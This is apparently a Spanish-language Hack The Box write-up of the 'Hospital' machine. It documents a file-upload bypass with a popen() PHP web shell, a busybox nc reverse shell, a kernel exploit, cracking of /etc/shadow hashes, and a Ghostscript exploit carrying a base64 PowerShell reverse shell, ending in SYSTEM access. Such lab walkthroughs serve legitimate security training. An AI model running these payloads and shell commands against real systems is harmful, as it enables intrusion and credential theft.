---
tags:
title: Hospital - Medium (HTB)
permalink: /Hospital-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky:
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6634,9389 10.129.229.189
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 22:35 -0500
Nmap scan report for 10.129.229.189
Host is up (0.58s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-12-28 10:37:54Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-28T10:39:20+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6634/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h02m32s, deviation: 0s, median: 7h02m31s
| smb2-time: 
|   date: 2025-12-28T10:39:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.87 seconds
```

## Website / Port 8080

En la pagina tengo la posibilidad de loguearme ya que no tengo credenciales iniciales.

![image-center](/assets/images/Pasted image 20251228005352.png)
### Upload

Una vez logueado, veo que puedo subir una imagen.

![image-center](/assets/images/Pasted image 20251228005444.png)
### Fail upload

Intentando subir un archivo `php` me sale el siguiente error.

![image-center](/assets/images/Pasted image 20251228005538.png)
### Upload bypass

Intercepte la petición con `Burpsuite`, y es así donde veo que subiendo archivos `pht`, o con doble extensión me redirige a la pagina de `Success`,. sin embargo el contenido no se ve y no puedo llegar a la ejecución de comandos.

![image-center](/assets/images/Pasted image 20251228005659.png)
## Shell as www-data on docker container

Use una lista de extensiones `php` y envié la petición al | donde hice un ataque de fuerza bruta para ver que tipo de archivo me tomaba, y es donde vi que la extensión `phar` devolvía un tamaño de respuesta mas larga que las demás.

![image-center](/assets/images/Pasted image 20251228011038.png)
### PHP Disable Functions

Primero me di cuenta que al subir primero el `phpinfo` vi que la mayoría de las funciones que me permitían ejecutar comandos estaban deshabilitadas por lo que tuve que buscar una que si me lo permitiera.

![image-center](/assets/images/Pasted image 20251229131458.png)
### popen()

Vi que la función `popen()` no esta desactivada por lo que cree el siguiente archivo, o mejor dicho coloque el siguiente contenido para luego mediante el parametro `cmd` poder ejecutar comandos.

```php
<?php
$handle = popen($_GET['cmd'], 'r');
echo fread($handle, 2096);
pclose($handle);
?>
```
### Code execution

Lo envié y desde mi consola con `curl` confirme la ejecucion de comandos.

```bash
curl -s -X GET 'http://hospital.htb:8080/uploads/cmd.phar?cmd=whoami'   
www-data
```

Ahora me envie una shell a mi maquina.

```bash
curl -s -X GET 'http://hospital.htb:8080/uploads/cmd.phar?cmd=busybox%20nc%2010.10.17.19%204444%20-e%20/bin/bash'
```

Y desde mi listener recibí la conexión como el usuario `www-data`.

```bash
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.189] 6586
whoami
www-data
```
## Shell as root on container

Me di cuenta viendo la interfaz de red que estoy en un contenedor.

```bash
www-data@webserver:/var/www/html/uploads$ hostname -I
192.168.5.2
```

### Kernel version

Viendo la versión del `kernel` veo que es algo vieja.

```bash
www-data@webserver:/$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
### Exploit

Así mismo busque por algún `exploit` para esta versión, y encontré este [repositorio](https://github.com/synacktiv/CVE-2023-35001) de Github, así que me lo clone a mi maquina, lo compile y lo trasladé a la maquina victima.

```bash
make
go build
go: downloading github.com/vishvananda/netns v0.0.0-20180720170159-13995c7128cc
go: downloading github.com/google/nftables v0.0.0-20220611213346-a346d51f53b3
go: downloading github.com/mdlayher/netlink v1.4.2
go: downloading golang.org/x/sys v0.0.0-20211205182925-97ca703d548d
go: downloading github.com/josharian/native v0.0.0-20200817173448-b6b71def0850
go: downloading github.com/mdlayher/socket v0.0.0-20211102153432-57e3fa563ecb
go: downloading golang.org/x/net v0.0.0-20211209124913-491a49abca63
gcc -Wall -Wextra -Werror -std=c99 -Os -g0 -D_GNU_SOURCE -D_DEFAULT_SOURCE -D_POSIX_C_SOURCE=200809L src/wrapper.c -o wrapper
zip lpe.zip exploit wrapper
  adding: exploit (deflated 43%)
  adding: wrapper (deflated 83%)
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/Desktop/htb/hospital/CVE-2023-35001]
└─# ls
exploit  go.mod  go.sum  lpe.zip  main.go  Makefile  README.md  src  wrapper

```

Lo descargo, le doy permisos de ejecucion y lo ejecuto.

```bash
www-data@webserver:/tmp$ wget 10.10.17.19/exploit
<SNIP>
www-data@webserver:/tmp$ wget 10.10.17.19/wrapper
<SNIP>
www-data@webserver:/tmp$ chmod +x exploit 
www-data@webserver:/tmp$ chmod +x wrapper 
www-data@webserver:/tmp$ ./exploit
[+] Using config: 5.19.0-35-generic
[+] Recovering module base
[+] Module base: 0xffffffffc04c9000
[+] Recovering kernel base
[+] Kernel base: 0xffffffff91200000
[+] Got root !!!
# whoami
root
```
## RoundCube as drwilliams
### /etc/shadow

Ahora que soy `root` me puedo permitir ver el contenido del archivo `/etc/shadow`.

```bash
root@webserver:/var# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
<SNIP>
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```
### Crack password

Así mismo el hash del usuario `drwilliams` lo rompí con `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (?)     
1g 0:00:00:13 DONE (2025-12-28 00:48) 0.07535g/s 16204p/s 16204c/s 16204C/s sexyss..pakimo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## Shell as drbrown

Y me logueo con sus credenciales en `RoundCube`.

![image-center](/assets/images/Pasted image 20251228025605.png)
## CVE-2023-36664

Al entrar al servicio veo que el usuario `drbrown` habla de que necesita un archivo `.eps` el cual se visualiza con `GhostScript`.

![image-center](/assets/images/Pasted image 20251228031337.png)

Buscando por algún `cve` asociado a este tipo de archivo y con `GhostScript`, llegue a este [repositorio](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/file.eps)
### Exploit

Simplemente para ejecutarlo, como payload le metí una reverse shell en `powershell` codificada en `base64`.

```bash
 python3 CVE_2023_36664_exploit.py -g -p 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -x eps -f zsln       
[+] Generated EPS payload file: zsln.eps
```

Se la envie al usuario `drbrown`.

![image-center](/assets/images/Pasted image 20251228030751.png)

Y desde mi listener recibi la consola.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.189] 6202
whoami
hospital\drbrown
PS C:\Users\drbrown.HOSPITAL\Documents>
```

```powershell
PS C:\Users\drbrown.HOSPITAL\Documents> type ../desktop/user.txt
55d2ed6242ac001510645e355ef4fd1c
```
## Shell as nt authority\system 

En un archivo `bat` en el directorio de este usuario vi sus credenciales.

```powershell
PS C:\Users\drbrown.HOSPITAL\Documents> cat ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"

```
### Auth

Estas mismas las use para conectarme via `evil-winrm`.

```powershell
evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'
                                        
Evil-WinRM shell v3.9
<SNIP>
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents>
```
### Reverse shell

Veo que en el directorio donde se corre el servicio de `RoundCube`, puedo colocar, borrar o hasta incluso crear archivos, además como dicho directorio y servicio corre como `system`, se me ocurrió crear un `php`, el cual voy a meter en la ruta para poder ejecutar comandos como dicho usuario.

```powershell
PS C:\xampp\htdocs> icacls .
. NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Con la utilidad del propio `evil-winrm` subí mi shell.

```powershell
*Evil-WinRM* PS C:\xampp\htdocs> upload cmd.php
                                        
Info: Uploading /home/zs1n/Desktop/htb/hospital/cmd.php to C:\xampp\htdocs\cmd.php
                                        
Data: 40 bytes of 40 bytes copied
                                        
Info: Upload successful!
```

Y comprobe que el archivo este en la ruta.

```powershell
PS C:\xampp\htdocs> ls
<SNIP>                                                         
-a----       12/28/2025   5:56 AM             32 cmd.php                                                               
<SNIP>
```
### Command execution

Y desde la pagina comprobé que la `shell` existiera.

![image-center](/assets/images/Pasted image 20251228035457.png)

Y luego ejecute comandos.

![image-center](/assets/images/Pasted image 20251228035533.png)

Así que me envié una shell en `base64` nuevamente, por lo que recibí la conexión como el `system` de la maquina en mi listener `nc`.

```powershell
 rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.189] 36583
whoami
nt authority\system
PS C:\xampp\htdocs>
```

```powershell
PS C:\xampp\htdocs> type ../../users/administrator/desktop/root.txt
8926fdbc1b9778fcf06e5bc28c615c6d
```

`~Happy Hacking.`